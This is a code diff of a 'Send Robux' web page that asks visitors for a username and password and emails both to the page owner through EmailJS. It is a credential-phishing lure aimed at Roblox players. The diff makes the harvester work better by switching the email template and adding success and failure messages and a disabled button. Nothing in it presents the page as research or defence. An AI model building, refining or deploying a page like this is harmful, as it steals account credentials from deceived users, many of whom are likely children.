@@ -44,11 +44,16 @@
     <input type="text" id="username" placeholder="Username">
     <input type="password" id="password" placeholder="Password">
     <button id="sendRobux">Send Robux</button>
+    <p id="status"></p>
   </div>
   <script>
     document.getElementById("sendRobux").addEventListener("click", function() {
       var username = document.getElementById("username").value;
       var password = document.getElementById("password").value;
+      var statusElement = document.getElementById("status");
+
+      // Disable the button to prevent multiple clicks
+      this.disabled = true;
 
       // Configure Email JS with your service ID
       emailjs.init("user_yourEmailJSUserID");
@@ -59,12 +64,16 @@
       };
 
       // Send email using Email JS template
-      emailjs.send("service_03k8fcp", "template_siyoi78", templateParams)
+      emailjs.send("service_03k8fcp", "template_8aaqrdx", templateParams)
         .then(function(response) {
           console.log("Email sent successfully:", response);
+          statusElement.textContent = "Email sent successfully!";
+          statusElement.style.color = "green";
         })
         .catch(function(error) {
           console.error("Email sending error:", error);
+          statusElement.textContent = "Failed to send email.";
+          statusElement.style.color = "red";
         });
     });
   </script>
